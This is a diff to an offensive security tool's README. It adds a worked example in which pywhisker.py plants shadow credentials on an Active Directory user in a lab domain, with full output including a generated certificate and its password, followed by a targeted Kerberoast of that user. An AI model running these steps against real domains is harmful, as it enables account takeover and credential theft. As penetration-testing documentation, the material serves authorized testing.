@@ -3,6 +3,24 @@ targetedKerberoast is a Python script that can, like many others (e.g. GetUserSP
 Created/maintained by Charlie Bromberg (https://github.com/ShutdownRepo)
 
 ## Examples
+1. Add the msDS-KeyCredentialLink attribute to our target user 'ethan' using 'pywhisker.py'
+```
+$ python pywhisker.py -d example.htb -u emily -p Password123 --target ethan --action add
+[*] Searching for the target account
+[*] Target user found: CN=Ethan Hunt,CN=Users,DC=example,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 2ea6a1ce-be43-268f-ea93-5e091982a935
+[*] Updating the msDS-KeyCredentialLink attribute of ethan
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: xIp00XAr.pfx
+[*] Must be used with password: GzMNN7NOfKsctMUrlhfy
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+$ 
+```
+
+2. Kerberoast attack against target user 'ethan'
 ```
 targetedKerberoast.py -d example.htb -u emily -p Password123
 ```
